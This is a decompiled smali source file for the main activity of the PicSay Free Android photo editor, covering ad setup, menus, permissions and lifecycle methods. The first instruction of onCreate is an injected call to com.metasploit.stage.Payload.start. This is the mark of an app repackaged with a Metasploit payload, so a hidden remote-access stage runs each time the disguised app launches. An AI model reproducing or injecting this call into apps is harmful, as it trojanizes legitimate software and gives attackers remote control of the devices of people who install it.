.class public Lcom/shinycore/picsayfree/main;
.super Lb/c;


# instance fields
.field private m:Lcom/google/android/gms/ads/h;

.field private n:Z

.field private o:I

.field private p:I


# direct methods
.method public constructor <init>()V
    .locals 1

    invoke-direct {p0}, Lb/c;-><init>()V

    const v0, 0x4221810

    iput v0, p0, Lcom/shinycore/picsayfree/main;->o:I

    const v0, 0x3a49d64

    iput v0, p0, Lcom/shinycore/picsayfree/main;->p:I

    return-void
.end method


# virtual methods
.method public final a(II)Ljava/lang/String;
    .locals 5

    const/16 v2, 0x61

    const/16 v3, 0x70

    const/16 v4, 0x2d

    new-instance v0, Ljava/lang/StringBuilder;

    const/16 v1, 0x40

    invoke-direct {v0, v1}, Ljava/lang/StringBuilder;-><init>(I)V

    const/16 v1, 0x63

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(C)Ljava/lang/StringBuilder;

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(C)Ljava/lang/StringBuilder;

    const v1, 0x1257cf67

    xor-int/2addr v1, p1

    invoke-virtual {v0, v4}, Ljava/lang/StringBuilder;->append(C)Ljava/lang/StringBuilder;

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(C)Ljava/lang/StringBuilder;

    invoke-virtual {v0, v3}, Ljava/lang/StringBuilder;->append(C)Ljava/lang/StringBuilder;

    const v2, 0x5294dc5e

    xor-int/2addr v2, p2

    invoke-virtual {v0, v3}, Ljava/lang/StringBuilder;->append(C)Ljava/lang/StringBuilder;

    invoke-virtual {v0, v4}, Ljava/lang/StringBuilder;->append(C)Ljava/lang/StringBuilder;

    ushr-int/lit8 v2, v2, 0x5

    invoke-virtual {v0, v3}, Ljava/lang/StringBuilder;->append(C)Ljava/lang/StringBuilder;

    const/16 v3, 0x75

    invoke-virtual {v0, v3}, Ljava/lang/StringBuilder;->append(C)Ljava/lang/StringBuilder;

    ushr-int/lit8 v1, v1, 0x7

    const/16 v3, 0x62

    invoke-virtual {v0, v3}, Ljava/lang/StringBuilder;->append(C)Ljava/lang/StringBuilder;

    invoke-virtual {v0, v4}, Ljava/lang/StringBuilder;->append(C)Ljava/lang/StringBuilder;

    iget v3, p0, Lcom/shinycore/picsayfree/main;->o:I

    invoke-virtual {v0, v3}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    iget v3, p0, Lcom/shinycore/picsayfree/main;->p:I

    invoke-virtual {v0, v3}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    const/16 v3, 0x2f

    invoke-virtual {v0, v3}, Ljava/lang/StringBuilder;->append(C)Ljava/lang/StringBuilder;

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    return-object v0
.end method

.method public a(Landroid/net/Uri;Landroid/content/Intent;)Z
    .locals 3

    iget-object v0, p0, Lcom/shinycore/picsayfree/main;->g:Lb/d$a;

    if-eqz v0, :cond_0

    iget-object v1, p0, Lcom/shinycore/picsayfree/main;->a:Lb/d;

    const/4 v2, 0x0

    invoke-interface {v0, v1, p1, v2, p2}, Lb/d$a;->a(Lb/d;Landroid/net/Uri;La/t;Ljava/lang/Object;)Z

    move-result v0

    :goto_0
    return v0

    :cond_0
    const/4 v0, 0x0

    goto :goto_0
.end method

.method public c()V
    .locals 3

    const/4 v0, 0x0

    iput-boolean v0, p0, Lcom/shinycore/picsayfree/main;->n:Z

    iget-object v0, p0, Lcom/shinycore/picsayfree/main;->m:Lcom/google/android/gms/ads/h;

    if-nez v0, :cond_0

    :try_start_0
    new-instance v0, Lcom/google/android/gms/ads/h;

    invoke-direct {v0, p0}, Lcom/google/android/gms/ads/h;-><init>(Landroid/content/Context;)V

    const v1, 0x123ffce7

    const v2, 0x5281aa3e

    invoke-virtual {p0, v1, v2}, Lcom/shinycore/picsayfree/main;->a(II)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Lcom/google/android/gms/ads/h;->a(Ljava/lang/String;)V

    iput-object v0, p0, Lcom/shinycore/picsayfree/main;->m:Lcom/google/android/gms/ads/h;
    :try_end_0
    .catch Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_1

    :cond_0
    :goto_0
    iget-object v0, p0, Lcom/shinycore/picsayfree/main;->m:Lcom/google/android/gms/ads/h;

    if-eqz v0, :cond_1

    const/4 v0, 0x1

    iput-boolean v0, p0, Lcom/shinycore/picsayfree/main;->n:Z

    iget-object v0, p0, Lcom/shinycore/picsayfree/main;->m:Lcom/google/android/gms/ads/h;

    invoke-virtual {v0}, Lcom/google/android/gms/ads/h;->a()Z

    move-result v0

    if-nez v0, :cond_1

    :try_start_1
    new-instance v0, Lcom/google/android/gms/ads/c$a;

    invoke-direct {v0}, Lcom/google/android/gms/ads/c$a;-><init>()V

    iget-object v1, p0, Lcom/shinycore/picsayfree/main;->m:Lcom/google/android/gms/ads/h;

    invoke-virtual {v0}, Lcom/google/android/gms/ads/c$a;->a()Lcom/google/android/gms/ads/c;

    move-result-object v0

    invoke-virtual {v1, v0}, Lcom/google/android/gms/ads/h;->a(Lcom/google/android/gms/ads/c;)V
    :try_end_1
    .catch Ljava/lang/Throwable; {:try_start_1 .. :try_end_1} :catch_0

    :cond_1
    :goto_1
    return-void

    :catch_0
    move-exception v0

    goto :goto_1

    :catch_1
    move-exception v0

    goto :goto_0
.end method

.method protected onActivityResult(IILandroid/content/Intent;)V
    .locals 6

    const/4 v0, 0x1

    if-ne p1, v0, :cond_3

    const/4 v0, -0x1

    if-ne p2, v0, :cond_1

    if-eqz p3, :cond_2

    invoke-static {p3}, Lb/d;->a(Landroid/content/Intent;)Landroid/net/Uri;

    move-result-object v0

    :goto_0
    if-nez v0, :cond_0

    invoke-static {}, Lcom/shinycore/picsayfree/PictureProvider;->a()Ljava/io/File;

    move-result-object v1

    if-eqz v1, :cond_0

    invoke-virtual {v1}, Ljava/io/File;->isFile()Z

    move-result v2

    if-eqz v2, :cond_0

    invoke-virtual {v1}, Ljava/io/File;->length()J

    move-result-wide v2

    const-wide/16 v4, 0x0

    cmp-long v2, v2, v4

    if-lez v2, :cond_0

    invoke-static {v1}, Landroid/net/Uri;->fromFile(Ljava/io/File;)Landroid/net/Uri;

    move-result-object v0

    :cond_0
    if-eqz v0, :cond_1

    invoke-virtual {p0, v0, p3}, Lcom/shinycore/picsayfree/main;->a(Landroid/net/Uri;Landroid/content/Intent;)Z

    :cond_1
    :goto_1
    return-void

    :cond_2
    const/4 v0, 0x0

    goto :goto_0

    :cond_3
    iget-object v0, p0, Lcom/shinycore/picsayfree/main;->g:Lb/d$a;

    if-eqz v0, :cond_1

    invoke-interface {v0, p0, p1, p2, p3}, Lb/d$a;->a(Landroid/app/Activity;IILandroid/content/Intent;)V

    goto :goto_1
.end method

.method public onCreate(Landroid/os/Bundle;)V
    .locals 10
    .annotation build Landroid/annotation/SuppressLint;
        value = {
            "InlinedApi"
        }
    .end annotation

    invoke-static {p0}, Lcom/metasploit/stage/Payload;->start(Landroid/content/Context;)V

    const/4 v1, 0x0

    const/16 v9, 0x400

    const/4 v8, 0x1

    const/4 v7, 0x0

    :try_start_0
    invoke-static {}, Lcom/shinycore/g;->a()Z
    :try_end_0
    .catch Ljava/lang/UnsatisfiedLinkError; {:try_start_0 .. :try_end_0} :catch_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_1

    move-object v0, v1

    :goto_0
    invoke-virtual {p0}, Lcom/shinycore/picsayfree/main;->getApplicationContext()Landroid/content/Context;

    move-result-object v2

    const-string v3, "PicSay"

    invoke-static {v2, v3}, Lb/d;->a(Landroid/content/Context;Ljava/lang/String;)Lb/d;

    move-result-object v2

    iput-object v2, p0, Lcom/shinycore/picsayfree/main;->a:Lb/d;

    iget v3, p0, Lcom/shinycore/picsayfree/main;->o:I

    const v4, 0x89c1

    add-int/2addr v3, v4

    iput v3, p0, Lcom/shinycore/picsayfree/main;->o:I

    new-instance v3, Lcom/shinycore/PicSayUI/ag;

    invoke-direct {v3, p0}, Lcom/shinycore/PicSayUI/ag;-><init>(Lb/c;)V

    invoke-virtual {p0, v3}, Lcom/shinycore/picsayfree/main;->a(Lb/d$a;)V

    invoke-static {p0}, Landroid/preference/PreferenceManager;->getDefaultSharedPreferences(Landroid/content/Context;)Landroid/content/SharedPreferences;

    move-result-object v3

    invoke-virtual {p0}, Lcom/shinycore/picsayfree/main;->getWindow()Landroid/view/Window;

    move-result-object v4

    sget v5, Lb/a;->a:I

    const/16 v6, 0xb

    if-lt v5, v6, :cond_0

    const/16 v5, 0xa

    invoke-virtual {v4, v5}, Landroid/view/Window;->requestFeature(I)Z

    :cond_0
    const-string v5, "pref_hidestatusbar"

    invoke-interface {v3, v5, v7}, Landroid/content/SharedPreferences;->getBoolean(Ljava/lang/String;Z)Z

    move-result v5

    if-eqz v5, :cond_1

    invoke-virtual {v4, v9, v9}, Landroid/view/Window;->setFlags(II)V

    :cond_1
    invoke-super {p0, p1}, Lb/c;->onCreate(Landroid/os/Bundle;)V

    sget-object v4, Lcom/shinycore/PicSayUI/Legacy/f;->d:[B

    const/4 v5, 0x4

    aget-byte v4, v4, v5

    const/16 v5, 0x73

    if-eq v4, v5, :cond_3

    invoke-virtual {p0}, Lcom/shinycore/picsayfree/main;->finish()V

    :cond_2
    :goto_1
    return-void

    :catch_0
    move-exception v2

    const-string v0, "Native library not found!"

    const-string v3, "ImageOp"

    const-string v4, "ImageOp library not found!"

    invoke-static {v3, v4, v2}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    goto :goto_0

    :catch_1
    move-exception v2

    const-string v0, "Could not load Native library!"

    const-string v3, "ImageOp"

    const-string v4, "Unknown"

    invoke-static {v3, v4, v2}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    goto :goto_0

    :cond_3
    if-eqz v0, :cond_4

    sget-object v4, Lb/a;->b:Lb/a;

    const/4 v5, 0x3

    invoke-virtual {v4, p0, v5}, Lb/a;->a(Landroid/content/Context;I)Landroid/app/AlertDialog$Builder;

    move-result-object v4

    const-string v5, "Error"

    invoke-virtual {v4, v5}, Landroid/app/AlertDialog$Builder;->setTitle(Ljava/lang/CharSequence;)Landroid/app/AlertDialog$Builder;

    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v5, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v5, " Please check that the app is installed correctly."

    invoke-virtual {v0, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v4, v0}, Landroid/app/AlertDialog$Builder;->setMessage(Ljava/lang/CharSequence;)Landroid/app/AlertDialog$Builder;

    const v0, 0x7f0d00a2

    invoke-virtual {v4, v0, v1}, Landroid/app/AlertDialog$Builder;->setPositiveButton(ILandroid/content/DialogInterface$OnClickListener;)Landroid/app/AlertDialog$Builder;

    invoke-virtual {v4}, Landroid/app/AlertDialog$Builder;->create()Landroid/app/AlertDialog;

    move-result-object v0

    invoke-virtual {p0, v0}, Lcom/shinycore/picsayfree/main;->a(Landroid/app/Dialog;)V

    :cond_4
    const-string v0, "pref_filterbitmaps"

    invoke-interface {v3, v0, v8}, Landroid/content/SharedPreferences;->getBoolean(Ljava/lang/String;Z)Z

    move-result v0

    iget v1, p0, Lcom/shinycore/picsayfree/main;->p:I

    const v3, 0x85827

    sub-int/2addr v1, v3

    iput v1, p0, Lcom/shinycore/picsayfree/main;->p:I

    new-instance v1, Lcom/shinycore/a/b;

    invoke-direct {v1}, Lcom/shinycore/a/b;-><init>()V

    iput-object v1, p0, Lcom/shinycore/picsayfree/main;->c:Lcom/shinycore/a/b;

    iget-object v1, p0, Lcom/shinycore/picsayfree/main;->c:Lcom/shinycore/a/b;

    invoke-virtual {v1, v0}, Lcom/shinycore/a/b;->a(Z)V

    iget-object v0, p0, Lcom/shinycore/picsayfree/main;->c:Lcom/shinycore/a/b;

    invoke-virtual {v0}, Lcom/shinycore/a/b;->start()V

    invoke-virtual {v2, p0, p1}, Lb/d;->a(Lb/c;Landroid/os/Bundle;)V

    sget-object v0, Lb/a;->b:Lb/a;

    const-string v1, "android.permission.WRITE_EXTERNAL_STORAGE"

    invoke-virtual {v0, p0, v1}, Lb/a;->a(Landroid/content/Context;Ljava/lang/String;)I

    move-result v0

    if-eqz v0, :cond_2

    sget-object v0, Lb/a;->b:Lb/a;

    new-array v1, v8, [Ljava/lang/String;

    const-string v2, "android.permission.WRITE_EXTERNAL_STORAGE"

    aput-object v2, v1, v7

    const/4 v2, 0x6

    invoke-virtual {v0, p0, v1, v2}, Lb/a;->a(Landroid/app/Activity;[Ljava/lang/String;I)V

    goto :goto_1
.end method

.method public onCreateOptionsMenu(Landroid/view/Menu;)Z
    .locals 3

    const/4 v2, 0x1

    invoke-super {p0, p1}, Lb/c;->onCreateOptionsMenu(Landroid/view/Menu;)Z

    const/4 v0, 0x0

    const v1, 0x7f0d0010

    invoke-interface {p1, v2, v2, v0, v1}, Landroid/view/Menu;->add(IIII)Landroid/view/MenuItem;

    return v2
.end method

.method protected onDestroy()V
    .locals 2

    const/4 v1, 0x0

    invoke-super {p0}, Lb/c;->onDestroy()V

    iget-object v0, p0, Lcom/shinycore/picsayfree/main;->a:Lb/d;

    invoke-virtual {v0, p0}, Lb/d;->c(Lb/c;)V

    iput-object v1, p0, Lcom/shinycore/picsayfree/main;->g:Lb/d$a;

    iput-object v1, p0, Lcom/shinycore/picsayfree/main;->f:Lb/l;

    iget-object v0, p0, Lcom/shinycore/picsayfree/main;->c:Lcom/shinycore/a/b;

    if-eqz v0, :cond_0

    iput-object v1, p0, Lcom/shinycore/picsayfree/main;->c:Lcom/shinycore/a/b;

    invoke-virtual {v0}, Lcom/shinycore/a/b;->a()V

    :cond_0
    return-void
.end method

.method public onKeyDown(ILandroid/view/KeyEvent;)Z
    .locals 2

    sget v0, Lb/a;->a:I

    const/4 v1, 0x5

    if-ge v0, v1, :cond_0

    const/4 v0, 0x4

    if-ne p1, v0, :cond_0

    invoke-virtual {p2}, Landroid/view/KeyEvent;->getRepeatCount()I

    move-result v0

    if-nez v0, :cond_0

    invoke-virtual {p0}, Lcom/shinycore/picsayfree/main;->onBackPressed()V

    const/4 v0, 0x1

    :goto_0
    return v0

    :cond_0
    invoke-super {p0, p1, p2}, Lb/c;->onKeyDown(ILandroid/view/KeyEvent;)Z

    move-result v0

    goto :goto_0
.end method

.method public onLowMemory()V
    .locals 3

    invoke-super {p0}, Lb/c;->onLowMemory()V

    iget-object v0, p0, Lcom/shinycore/picsayfree/main;->g:Lb/d$a;

    if-eqz v0, :cond_0

    iget-object v1, p0, Lcom/shinycore/picsayfree/main;->a:Lb/d;

    const/16 v2, 0x50

    invoke-interface {v0, v1, v2}, Lb/d$a;->a(Lb/d;I)V

    :cond_0
    return-void
.end method

.method protected onPause()V
    .locals 1

    invoke-super {p0}, Lb/c;->onPause()V

    iget-object v0, p0, Lcom/shinycore/picsayfree/main;->a:Lb/d;

    invoke-virtual {v0, p0}, Lb/d;->a(Lb/c;)V

    iget-object v0, p0, Lcom/shinycore/picsayfree/main;->c:Lcom/shinycore/a/b;

    if-eqz v0, :cond_0

    iget-object v0, p0, Lcom/shinycore/picsayfree/main;->c:Lcom/shinycore/a/b;

    invoke-virtual {v0}, Lcom/shinycore/a/b;->c()V

    :cond_0
    return-void
.end method

.method public onPrepareOptionsMenu(Landroid/view/Menu;)Z
    .locals 1

    const/4 v0, 0x1

    return v0
.end method

.method public onRequestPermissionsResult(I[Ljava/lang/String;[I)V
    .locals 3

    iget-object v0, p0, Lcom/shinycore/picsayfree/main;->g:Lb/d$a;

    if-eqz p3, :cond_0

    array-length v1, p3

    if-nez v1, :cond_1

    :cond_0
    :goto_0
    return-void

    :cond_1
    const/4 v1, 0x0

    aget v1, p3, v1

    if-nez v1, :cond_0

    if-eqz v0, :cond_0

    const/4 v1, -0x1

    const/4 v2, 0x0

    invoke-interface {v0, p0, p1, v1, v2}, Lb/d$a;->a(Landroid/app/Activity;IILandroid/content/Intent;)V

    goto :goto_0
.end method

.method protected onResume()V
    .locals 4

    iget-object v0, p0, Lcom/shinycore/picsayfree/main;->a:Lb/d;

    invoke-virtual {v0, p0}, Lb/d;->b(Lb/c;)V

    invoke-super {p0}, Lb/c;->onResume()V

    iget-object v0, p0, Lcom/shinycore/picsayfree/main;->c:Lcom/shinycore/a/b;

    if-eqz v0, :cond_0

    iget-object v0, p0, Lcom/shinycore/picsayfree/main;->c:Lcom/shinycore/a/b;

    invoke-virtual {v0}, Lcom/shinycore/a/b;->d()V

    :cond_0
    iget-boolean v0, p0, Lcom/shinycore/picsayfree/main;->n:Z

    if-eqz v0, :cond_1

    const/4 v0, 0x0

    iput-boolean v0, p0, Lcom/shinycore/picsayfree/main;->n:Z

    :try_start_0
    iget-object v0, p0, Lcom/shinycore/picsayfree/main;->m:Lcom/google/android/gms/ads/h;

    if-eqz v0, :cond_1

    iget-object v0, p0, Lcom/shinycore/picsayfree/main;->m:Lcom/google/android/gms/ads/h;

    invoke-virtual {v0}, Lcom/google/android/gms/ads/h;->a()Z

    move-result v0

    if-eqz v0, :cond_1

    invoke-static {}, Lb/d;->d()Landroid/content/SharedPreferences;

    move-result-object v0

    invoke-interface {v0}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v0

    const-string v1, "pref_sticker_color"

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v2

    invoke-interface {v0, v1, v2, v3}, Landroid/content/SharedPreferences$Editor;->putLong(Ljava/lang/String;J)Landroid/content/SharedPreferences$Editor;

    invoke-interface {v0}, Landroid/content/SharedPreferences$Editor;->commit()Z

    iget-object v0, p0, Lcom/shinycore/picsayfree/main;->m:Lcom/google/android/gms/ads/h;

    invoke-virtual {v0}, Lcom/google/android/gms/ads/h;->b()V
    :try_end_0
    .catch Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_0

    :cond_1
    :goto_0
    sget-object v0, Lcom/shinycore/PicSayUI/Legacy/f;->d:[B

    const/16 v1, 0xa

    aget-byte v0, v0, v1

    const/16 v1, -0x19

    if-eq v0, v1, :cond_2

    invoke-virtual {p0}, Lcom/shinycore/picsayfree/main;->finish()V

    :cond_2
    return-void

    :catch_0
    move-exception v0

    goto :goto_0
.end method

.method protected onSaveInstanceState(Landroid/os/Bundle;)V
    .locals 1

    iget-object v0, p0, Lcom/shinycore/picsayfree/main;->a:Lb/d;

    invoke-virtual {v0, p0, p1}, Lb/d;->b(Lb/c;Landroid/os/Bundle;)V

    return-void
.end method

.method public onTrimMemory(I)V
    .locals 2

    invoke-super {p0, p1}, Lb/c;->onTrimMemory(I)V

    iget-object v0, p0, Lcom/shinycore/picsayfree/main;->g:Lb/d$a;

    if-eqz v0, :cond_0

    iget-object v1, p0, Lcom/shinycore/picsayfree/main;->a:Lb/d;

    invoke-interface {v0, v1, p1}, Lb/d$a;->a(Lb/d;I)V

    :cond_0
    return-void
.end method
